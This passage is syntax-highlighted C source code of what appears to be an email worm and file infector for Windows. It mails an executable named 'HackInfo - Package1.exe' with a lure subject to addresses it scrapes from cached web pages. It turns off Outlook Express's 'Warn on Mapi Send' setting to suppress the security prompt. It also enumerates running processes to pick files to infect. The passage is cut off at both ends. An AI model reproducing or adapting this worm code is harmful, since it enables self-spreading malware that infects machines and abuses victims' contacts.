        </span><span class="sc11">FreeLibrary</span><span class="sc10">(</span><span class="sc11">MapiModule</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">Founded</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">mfile</span><span class="sc10">.</span><span class="sc11">lpszPathName</span><span class="sc10">=</span><span class="sc11">VirusPath</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">mfile</span><span class="sc10">.</span><span class="sc11">lpszFileName</span><span class="sc10">=</span><span class="sc6">"HackInfo - Package1.exe"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">mfile</span><span class="sc10">.</span><span class="sc11">nPosition</span><span class="sc10">=-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">mfile</span><span class="sc10">.</span><span class="sc11">ulReserved</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">rec</span><span class="sc10">.</span><span class="sc11">ulRecipClass</span><span class="sc10">=</span><span class="sc11">MAPI_TO</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">rec</span><span class="sc10">.</span><span class="sc11">lpszName</span><span class="sc10">=</span><span class="sc11">addbook</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
        </span><span class="sc11">rec</span><span class="sc10">.</span><span class="sc11">ulReserved</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">msg</span><span class="sc10">.</span><span class="sc11">nFileCount</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">msg</span><span class="sc10">.</span><span class="sc11">lpszNoteText</span><span class="sc10">=</span><span class="sc11">mail_msg</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">msg</span><span class="sc10">.</span><span class="sc11">lpszSubject</span><span class="sc10">=</span><span class="sc6">"Best Hackers Teaching You How To Be Hacker !!!"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">msg</span><span class="sc10">.</span><span class="sc11">ulReserved</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">msg</span><span class="sc10">.</span><span class="sc11">nRecipCount</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">msg</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">=&amp;</span><span class="sc11">mfile</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">msg</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">=&amp;</span><span class="sc11">rec</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">__asm</span><span class="sc0"> </span><span class="sc1">/* MapiSendMail */</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">push</span><span class="sc0"> </span><span class="sc4">00h</span><span class="sc0">    </span><span class="sc10">;</span><span class="sc11">ulReserved</span><span class="sc0">
                </span><span class="sc11">push</span><span class="sc0"> </span><span class="sc4">00h</span><span class="sc0">    </span><span class="sc10">;</span><span class="sc11">flFlags</span><span class="sc0">
                </span><span class="sc11">lea</span><span class="sc0"> </span><span class="sc11">eax</span><span class="sc10">,</span><span class="sc11">msg</span><span class="sc0">
                </span><span class="sc11">push</span><span class="sc0"> </span><span class="sc11">eax</span><span class="sc0">    </span><span class="sc10">;</span><span class="sc11">lpMessage</span><span class="sc0">
                </span><span class="sc11">push</span><span class="sc0"> </span><span class="sc4">00h</span><span class="sc0">    </span><span class="sc10">;</span><span class="sc11">ulUIParam</span><span class="sc0">
                </span><span class="sc11">push</span><span class="sc0"> </span><span class="sc11">MapiSession</span><span class="sc0">    </span><span class="sc10">;</span><span class="sc11">lhSession</span><span class="sc0">
                </span><span class="sc11">call</span><span class="sc0"> </span><span class="sc11">SendMail</span><span class="sc0">
                </span><span class="sc11">mov</span><span class="sc0"> </span><span class="sc11">retvalue</span><span class="sc10">,</span><span class="sc11">eax</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">retvalue</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">FreeLibrary</span><span class="sc10">(</span><span class="sc11">MapiModule</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">__asm</span><span class="sc0"> </span><span class="sc1">/* MAPILogoff */</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">push</span><span class="sc0"> </span><span class="sc4">00h</span><span class="sc0">    </span><span class="sc10">;</span><span class="sc11">ulReserved</span><span class="sc0">
        </span><span class="sc11">push</span><span class="sc0"> </span><span class="sc4">00h</span><span class="sc0">    </span><span class="sc10">;</span><span class="sc11">flFlags</span><span class="sc0">
        </span><span class="sc11">push</span><span class="sc0"> </span><span class="sc4">00h</span><span class="sc0">    </span><span class="sc10">;</span><span class="sc11">ulUIParam</span><span class="sc0">
        </span><span class="sc11">push</span><span class="sc0"> </span><span class="sc11">MapiSession</span><span class="sc10">;</span><span class="sc11">lhSession</span><span class="sc0">
        </span><span class="sc11">call</span><span class="sc0"> </span><span class="sc11">LogOff</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">FreeLibrary</span><span class="sc10">(</span><span class="sc11">MapiModule</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">FindFilesAndMails</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">where</span><span class="sc10">[])</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">path</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc11">fullpath</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">],</span><span class="sc11">mailbuffer</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">already_have</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">hfiles</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">size_t</span><span class="sc0"> </span><span class="sc19">size</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">,</span><span class="sc11">where</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">,</span><span class="sc6">"*.*"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc11">find</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hfile</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">hfile</span><span class="sc10">=</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">,&amp;</span><span class="sc11">find</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">do</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">fullpath</span><span class="sc10">,</span><span class="sc11">where</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">fullpath</span><span class="sc10">,</span><span class="sc11">find</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">strlwr</span><span class="sc10">(</span><span class="sc11">find</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">find</span><span class="sc10">.</span><span class="sc11">dwFileAttributes</span><span class="sc10">==(</span><span class="sc11">FILE_ATTRIBUTE_SYSTEM</span><span class="sc10">+</span><span class="sc11">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc10">))</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">find</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">,</span><span class="sc6">"."</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">find</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">,</span><span class="sc6">".."</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">fullpath</span><span class="sc10">,</span><span class="sc6">"\\"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">FindFilesAndMails</span><span class="sc10">(</span><span class="sc11">fullpath</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">find</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">,</span><span class="sc6">"ht"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">hfiles</span><span class="sc10">=</span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">fullpath</span><span class="sc10">,</span><span class="sc6">"rt"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hfiles</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">do</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">already_have</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">mailbuffer</span><span class="sc10">,</span><span class="sc6">""</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc19">size</span><span class="sc10">=</span><span class="sc11">fread</span><span class="sc10">(&amp;</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">),</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">hfiles</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">strlwr</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">temp</span><span class="sc10">=</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"mailto:"</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">temp</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">temp</span><span class="sc10">=</span><span class="sc11">temp</span><span class="sc10">+</span><span class="sc4">7</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;(</span><span class="sc11">i</span><span class="sc10">&lt;=</span><span class="sc11">MAX_PATH</span><span class="sc10">)&amp;&amp;(*</span><span class="sc11">temp</span><span class="sc10">!=</span><span class="sc7">'"'</span><span class="sc10">)&amp;&amp;(*</span><span class="sc11">temp</span><span class="sc10">!=</span><span class="sc7">'?'</span><span class="sc10">)&amp;&amp;(*</span><span class="sc11">temp</span><span class="sc10">!=</span><span class="sc7">'&lt;'</span><span class="sc10">);</span><span class="sc11">i</span><span class="sc10">++,</span><span class="sc11">temp</span><span class="sc10">++)</span><span class="sc0">
                            </span><span class="sc11">mailbuffer</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=*</span><span class="sc11">temp</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc11">mailbuffer</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">mailbuffer</span><span class="sc10">,</span><span class="sc6">"@"</span><span class="sc10">)!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">mailbuffer</span><span class="sc10">)&lt;</span><span class="sc4">30</span><span class="sc10">)</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Founded</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">299</span><span class="sc10">)</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;=</span><span class="sc11">Founded</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">addbook</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc11">mailbuffer</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                                            </span><span class="sc11">already_have</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
                                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">already_have</span><span class="sc10">==</span><span class="sc11">FALSE</span><span class="sc10">)</span><span class="sc0">
                                    </span><span class="sc10">{</span><span class="sc0">
                                        </span><span class="sc11">Founded</span><span class="sc10">++;</span><span class="sc0">
                                        </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">addbook</span><span class="sc10">[</span><span class="sc11">Founded</span><span class="sc10">],</span><span class="sc11">mailbuffer</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc10">}</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc5">while</span><span class="sc10">(</span><span class="sc19">size</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">hfiles</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">FindNextFile</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">,&amp;</span><span class="sc11">find</span><span class="sc10">));</span><span class="sc0">
        </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Active_Worm</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">GetValue</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">GetSize</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">GetValue</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">fullpath</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc11">dir</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc11">p</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">x</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">GetWindowsDirectory</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">,</span><span class="sc11">MAX_PATH</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">,</span><span class="sc6">"\\Temporary Internet Files\\"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">FindFilesAndMails</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hkey</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc6">"Identities"</span><span class="sc10">,</span><span class="sc11">KEY_QUERY_VALUE</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,&amp;</span><span class="sc11">hkey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">fullpath</span><span class="sc10">,</span><span class="sc6">"Identities\\"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">x</span><span class="sc10">=</span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">hkey</span><span class="sc10">,</span><span class="sc6">"Default User ID"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">GetValue</span><span class="sc10">,&amp;</span><span class="sc11">GetSize</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">x</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">fullpath</span><span class="sc10">);</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">MAX_PATH</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++,</span><span class="sc11">p</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc11">fullpath</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc11">GetValue</span><span class="sc10">[</span><span class="sc11">p</span><span class="sc10">];</span><span class="sc0">
        </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">fullpath</span><span class="sc10">,</span><span class="sc6">"\\Software\\Microsoft\\Outlook Express\\5.0\\Mail"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">x</span><span class="sc10">=</span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc11">fullpath</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">KEY_WRITE</span><span class="sc10">,&amp;</span><span class="sc11">hkey</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">x</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hkey</span><span class="sc10">,</span><span class="sc6">"Warn on Mapi Send"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">REG_DWORD</span><span class="sc10">,(</span><span class="sc11">LPBYTE</span><span class="sc10">)&amp;</span><span class="sc11">x</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">x</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">   </span><span class="sc2">// ^-&gt; Micro$oft Security ;)
</span><span class="sc0">    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hkey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">SleepEx</span><span class="sc10">(</span><span class="sc4">1000</span><span class="sc10">,</span><span class="sc5">false</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">worming</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/*-------------------[Memory Resident Functions]--------------*/</span><span class="sc0">

</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">IsProcessExist</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">ProcName</span><span class="sc10">[])</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;=</span><span class="sc11">Position</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">lst</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc11">ProcName</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">TRUE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">add_proc</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">procname</span><span class="sc10">[])</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">IsProcessExist</span><span class="sc10">(</span><span class="sc11">procname</span><span class="sc10">)!=</span><span class="sc11">TRUE</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">Position</span><span class="sc10">++;</span><span class="sc0">
        </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">lst</span><span class="sc10">[</span><span class="sc11">Position</span><span class="sc10">],</span><span class="sc11">procname</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">ProcFindAll</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hsnp</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">hsnp</span><span class="sc10">=</span><span class="sc11">CreateToolhelp32Snapshot</span><span class="sc10">(</span><span class="sc11">TH32CS_SNAPPROCESS</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">stproc</span><span class="sc10">.</span><span class="sc11">dwSize</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">stproc</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">Process32First</span><span class="sc10">(</span><span class="sc11">hsnp</span><span class="sc10">,&amp;</span><span class="sc11">stproc</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">do</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">add_proc</span><span class="sc10">(</span><span class="sc11">stproc</span><span class="sc10">.</span><span class="sc11">szExeFile</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">Process32Next</span><span class="sc10">(</span><span class="sc11">hsnp</span><span class="sc10">,&amp;</span><span class="sc11">stproc</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hsnp</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">FindNextFileToInfect</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hsnp</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">found_it</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">my_Target</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">my_Target</span><span class="sc10">,</span><span class="sc6">""</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">Start</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">hsnp</span><span class="sc10">=</span><span class="sc11">CreateToolhelp32Snapshot</span><span class="sc10">(</span><span class="sc11">TH32CS_SNAPPROCESS</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">stproc</span><span class="sc10">.</span><span class="sc11">dwSize</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">stproc</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">Process32First</span><span class="sc10">(</span><span class="sc11">hsnp</span><span class="sc10">,&amp;</span><span class="sc11">stproc</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">do</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">SleepEx</span><span class="sc10">(</span><span class="sc4">10</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">IsProcessExist</span><span class="sc10">(</span><span class="sc11">stproc</span><span class="sc10">.</span><span class="sc11">szExeFile</span><span class="sc10">)==</span><span class="sc11">FALSE</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">add_proc</span><span class="sc10">(</span><span class="sc11">stproc</span><span class="sc10">.</span><span class="sc11">szExeFile</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">my_Target</span><span class="sc10">,</span><span class="sc11">stproc</span><span class="sc10">.</span><span class="sc11">szExeFile</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
